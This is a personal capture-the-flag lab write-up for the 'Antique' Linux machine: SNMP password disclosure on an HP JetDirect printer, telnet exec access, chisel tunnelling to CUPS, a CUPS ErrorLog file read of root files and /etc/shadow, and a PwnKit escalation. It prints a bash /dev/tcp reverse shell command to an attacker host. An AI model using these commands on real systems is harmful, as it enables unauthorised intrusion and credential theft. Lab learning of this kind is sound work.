# Antique

Difficulty: Easy
OS: Linux
Category: Offensive

![b966fca9d30da209a90dffad5f390acf.webp](b966fca9d30da209a90dffad5f390acf.webp)

### Reconnaissance Stage

Using `sudo nmap -sCV [target ip] -oN antique-scans` to scan for tcp ports

Found only a port 23 telnet and does not know the password. It’s an HP Jet Direct

Using `sudo nmap -sCV -sU [target ip] --top-ports 10 -oN antique-udp-scans` 

Found port 123/udp open|filtered ntp and port 161/udp snmp

Used snmpwalk as the tool `snmpwalk -v 2c -c public [target ip]` 

The output: 

![image.png](image.png)

From 0xdf’s walkthrough he found this link on how to reveal the password [https://www.irongeek.com/i.php?page=security/networkprinterhacking](https://www.irongeek.com/i.php?page=security/networkprinterhacking)

Using the command `snmpwalk -v 2c -c public [target ip] .1.3.6.1.4.1.11.2.3.9.1.1.13.0` reveals an hex character, this contains the password.

![image.png](image%201.png)

To decode this we can use python. Store the hex in a variable

```python
nums = "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 \
    30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 \
    98 103 106 111 114 115 119 122 123 126 130 131 134 135"
```

Next, using .split() we can break the string into an array of strings, splitting the spaces:

```python
nums.split()
```

Convert each to a number using base 16 to convert from hex

```python
[int(x, 16) for x in nums.split()]
```

Convert to an ASCII character using chr by its corresponding int. Then use ‘’.join to combine the list of characters.

```python
[chr(int(x, 16)) for x in nums.split()]
''.join([chr(int(x, 16)) for x in nums.split()])
```

Full code:

```python
nums = "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 \
    30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 \
    98 103 106 111 114 115 119 122 123 126 130 131 134 135"

dec = ''.join([chr(int(x, 16)) for x in nums.split()])

print(dec)

OUTPUT: P@ssw0rd@123!!123☺♥     ↨↑↓"#%&'01345789BCIPQTWXaetuyăĆđĔĕęĢģĦİıĴĵ
```

### Foothold

Now access the telnet with the password

Since I don’t know the commands I typed `?` , in the help the most interesting here is “exec”. So whenever I try to execute a command, the `exec` should be typed first then the command. E.g.: `exec whoami` 

Establish a reverse shell by finding the path of bash `exec which bash`

In my terminal I do `nc -lvnp 443`

Then in the telnet do, `exec bash -c 'bash -i >& /dev/tcp/[attacker's ip]/443 0>&1'` 

After a connection is established, list the files in the home directory by `ls ~` There’s a **user.txt** there we can grab the **FLAG**.

**I ALSO FOUND OUT** that if the connection in telnet is interrupted or if the terminal is messed up, we can just do `stty raw -echo; fg`  allows us to continue the session terminated earlier. But the ending messed up my terminal.

![image.png](image%202.png)

### Tunnel

There were a lot of trial and errors here because the terminal became unresponsive. At first I use the netcat reverse shell, but when transferring the file it just doesn’t work. 

But what worked for me is to use the `exploit(multi/handler)` from metasploit instead from netcat. It’s the same process from telnet when establishing a connection. But once a connection is established, we can upgrade the session into a meterpreter by backgrounding the sessions with `ctrl +z` then upgrade it with `sessions -u [session number]` .

I proceeded to download chisel from their new releases here https://github.com/jpillora/chisel/releases

Then chose the linux_amd64.gz version then used gunzip with it

Since transferring it as a whole still did not work for me. I converted it as base64 file first using `base64 chisel_linux_amd64 > chisel.b64` 

Then hosted an http server, and used wget from the victim machine with `wget http://[target ip]:[port]/chisel.b64 -O chisel.b64` 

Then 

decode it with `base64 -d chisel.b64 > chisel` 

Now I can use chisel at this point.

In order to access the port 631 which is CUPS, an open-source printing system we need to use chisel which is a proxy to route the traffic from the victim to attacker’s machine. 

From the attacker’s machine we do `./chisel server -p 9000 --reverse`

Then from the victim, we do `./chisel client [attacker ip]:9000 R:16631:127.0.0.1:631`

The port 16631 is the listening port that we can access from the attacker machine, instead of typing the port 631 when browsing it, we’ll just type the port 16631 to access the CUPS admin page.

### CUPS

Accessing the CUPS admin page allows us to see all the information, even the configuration file, error log, etc.

Since CUPS version is 1.6.1 there’s a vulnerability here which is **CVE-202-5519,** file read as root in CUPS 1.6.1.

There’s an article that shows how to run the module and breaking down how it might fail. [This article](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read).

Understanding the exploit, from 0xdf’s guide it says that if we look at [the exploit source](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/escalate/cups_root_file_read.rb), it’s using `cupsctl` (saved in the `ctl_path` variable) in a current session to set the error log to a different file (`datastore['FILE']` ):

```python
cmd_exec("#{ctl_path} ErrorLog=#{datastore['FILE']}")
```

A larget snippet of the code would be

```python
    # first we set the error log to the path intended
    cmd_exec("#{ctl_path} ErrorLog=#{datastore['FILE']}")
    cmd_exec("#{ctl_path} WebInterface=yes")
    @error_log_was_reset = true

    # now we go grab it from the ErrorLog route
    file = strip_http_headers(get_request('/admin/log/error_log'))
```

This means that when using the `cupsctl` tool we can point the `ErrorLog` to any file and get its content. 

```python
cupsctl ErrorLog=/root/root.txt
```

Then we can just grab the ErrorLog using curl since according to the source code of the metasploit exploit it’s an http header.

```python
curl 127.0.0.1:631/admin/log/error_log?
bbbdf21bafd685f78b9f38d2933ab449
```

Now we have the **root FLAG**. 

### Getting Root

But I am not done yet, because we still did not establish a shell as a root. We can use the same method to get the `/etc/shadow` 

```python
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
<SNIP>
pollinate:*:18375:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18891:0:99999:7:::
```

There’s only one user with a hash and that’s the root user. We can crack it with `hashcat` But this will take a long time. 

There’s one exploit that works in order to get root shell. While LinPEAS allows us to identify if host is vulnerable. This [post from Datadog](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/) shows how to manually check by running `dpkg -s policykit-1`

```python
Package: policykit-1
Status: install ok installed
Priority: optional
Section: admin
Installed-Size: 560
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Architecture: amd64
Multi-Arch: foreign
Version: 0.105-26ubuntu1.1
Depends: dbus, libpam-systemd, libc6 (>= 2.7), libexpat1 (>= 2.0.1), libglib2.0-0 (>= 2.37.3), libpam0g (>= 0.99.7.1), libpolkit-agent-1-0 (= 0.105-26ubuntu1.1), libpolkit-gobject-1-0 (= 0.105-26ubuntu1.1), libsystemd0 (>= 213)
Conffiles:
 /etc/pam.d/polkit-1 7c794427f656539b0d4659b030904fe0
 /etc/polkit-1/localauthority.conf.d/50-localauthority.conf 2adb9d174807b0a3521fabf03792fbc8
 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf c4dbd2117c52f367f1e8b8c229686b10
Description: framework for managing administrative policies and privileges
 PolicyKit is an application-level toolkit for defining and handling the policy
 that allows unprivileged processes to speak to privileged processes.
 .
 It is a framework for centralizing the decision making process with respect to
 granting access to privileged operations for unprivileged (desktop)
 applications.
Homepage: https://www.freedesktop.org/wiki/Software/polkit/
Original-Maintainer: Utopia Maintenance Team <pkg-utopia-maintainers@lists.alioth.debian.org>

```

Looking at the version it’s `0.105-26ubuntu1.1` . From DataDog post, that’s the last vulnerable version on Ubuntu 20.04.

The machine is vulnerable to [PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034). The POC is from Joe Ammond [here](https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py), then upload to Antique and run it. Once executed check the `id` command you’re now a root user.

![image.png](image%203.png)